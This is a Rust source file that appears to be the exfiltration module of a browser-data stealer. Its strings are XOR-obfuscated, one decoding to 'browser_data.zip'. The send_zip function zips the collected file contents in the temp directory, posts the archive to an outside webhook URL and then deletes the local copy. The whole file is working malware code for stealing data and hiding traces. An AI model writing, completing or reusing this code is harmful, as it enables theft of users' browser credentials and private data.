use std::{env, fs, io::Write};
use zip::write::FileOptions;

use super::{env_configured, xor_str};

fn s_browser_data_zip() -> String {
    xor_str(&[
        0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x3E, 0x3B, 0x2E, 0x3B, 0x74, 0x20, 0x33,
        0x2A,
    ])
}

fn s_application_zip() -> String {
    xor_str(&[
        0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x20, 0x33, 0x2A,
    ])
}

fn s_file() -> String {
    xor_str(&[0x3C, 0x33, 0x36, 0x3F])
}

fn s_webhook_failed() -> String {
    xor_str(&[
        0x2D, 0x3F, 0x38, 0x32, 0x35, 0x35, 0x31, 0x7A, 0x3C, 0x3B, 0x33, 0x36, 0x3F, 0x3E, 0x60,
        0x7A, 0x21, 0x29, 0x2E, 0x3B, 0x2E, 0x2F, 0x29, 0x27, 0x7A, 0x21, 0x38, 0x35, 0x3E, 0x23,
        0x27,
    ])
}

pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
) -> Result<(), Box<dyn std::error::Error>> {
    if !env_configured() {
        return Ok(());
    }

    if files.is_empty() {
        return Ok(());
    }

    let zip_path = env::temp_dir().join(s_browser_data_zip());

    {
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(s_browser_data_zip())
        .mime_str(&s_application_zip())?;

    let form = reqwest::multipart::Form::new().part(s_file(), part);

    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    let body = response.text().await.unwrap_or_default();
    if !status.is_success() {
        return Err(
            s_webhook_failed()
                .replace("{status}", &status.to_string())
                .replace("{body}", &body)
                .into(),
        );
    }

    let _ = fs::remove_file(&zip_path);

    Ok(())
}
